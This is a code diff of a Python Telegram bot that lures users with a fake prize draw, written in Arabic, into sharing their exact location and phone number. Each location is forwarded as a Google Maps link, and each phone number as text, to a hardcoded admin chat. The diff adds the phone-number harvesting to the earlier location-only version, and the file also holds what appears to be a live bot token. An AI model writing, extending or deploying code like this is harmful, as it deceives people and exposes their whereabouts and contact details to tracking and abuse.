@@ -1,47 +1,61 @@
 import telebot
-from telebot.types import Location, ReplyKeyboardMarkup, KeyboardButton
-import requests
+from telebot.types import Location, ReplyKeyboardMarkup, KeyboardButton, Contact
 
-#Replace with your bot's token
+# Replace with your bot's token
 bot = telebot.TeleBot("7628474532:AAHLQxj2lbrrlcR4j1wjcmFlbWzQtZ4JnsY")
 
 @bot.message_handler(commands=['start'])
 def start(message):
-    #Create a reply keyboard with a button for sharing location
+    # Create a reply keyboard with buttons for sharing location and contact
     keyboard = ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
-    button = KeyboardButton(text=" شارك موقعك الآن للحصول على فرصة للفوز", request_location=True)
-    keyboard.add(button)
+    location_button = KeyboardButton(text="📍 شارك موقعك الآن للحصول على فرصة للفوز", request_location=True)
+    contact_button = KeyboardButton(text="📞 شارك رقم هاتفك", request_contact=True)
+    keyboard.add(location_button, contact_button)
 
-    #Send a message to the user with the keyboard
+    # Send a message to the user with the keyboard
     bot.send_message(message.chat.id, """
 🎉 | أهلاً وسهلاً بك ! 
 🎁 | أنت الآن في سحب على جائزة قيمة ! 
-📍 قم بإرسال الموقع للمشاركة في السحب سنقوم بتسليم الجائزة مباشرة إلى باب منزلك من قبل فريق التوصيل 💨🚚
+📍 قم بإرسال الموقع ورقم الهاتف للمشاركة في السحب. سنقوم بتسليم الجائزة مباشرة إلى باب منزلك من قبل فريق التوصيل 💨🚚
 """, reply_markup=keyboard)
 
-@bot.message_handler(func=lambda message: True, content_types=['location'])
+@bot.message_handler(content_types=['location'])
 def get_location(message):
-    #Get the user's location 
+    # Get the user's location
     latitude = message.location.latitude
     longitude = message.location.longitude
 
-    #Create a URL for Google Maps with the user's location
+    # Create a URL for Google Maps with the user's location
     google_maps_url = f"https://www.google.com/maps/place/{latitude},{longitude}"
 
-    #Get the user's username and the current time
-    username = message.from_user.username
-    current_time = message.date
+    # Get the user's username
+    username = message.from_user.username or "مستخدم غير معروف"
 
-    #Create a message with the user's username, current time and Google Maps URL
+    # Create a message with the user's username and Google Maps URL
+    location_message = f"اسم المستخدم: {username}\nشارك موقعه: {google_maps_url}"
 
-
-    message = f"اسم المستخدم {username} شاركوا موقعهم معك  {current_time}  + موقع الدقيق للمستخدم {google_maps_url}"
-
-    #Replace with the admin's chat id
+    # Replace with the admin's chat id
     admin_chat_id = "1051175859"
 
-    #Send the message to the admin
-    bot.send_message(admin_chat_id, message)
+    # Send the location message to the admin
+    bot.send_message(admin_chat_id, location_message)
 
-#Start the bot
+@bot.message_handler(content_types=['contact'])
+def get_contact(message):
+    # Get the user's contact
+    phone_number = message.contact.phone_number
+
+    # Get the user's username
+    username = message.from_user.username or "مستخدم غير معروف"
+
+    # Create a message with the user's username and phone number
+    contact_message = f"اسم المستخدم: {username}\nشارك رقم هاتفه: {phone_number}"
+
+    # Replace with the admin's chat id
+    admin_chat_id = "1051175859"
+
+    # Send the contact message to the admin
+    bot.send_message(admin_chat_id, contact_message)
+
+# Start the bot
 bot.polling()
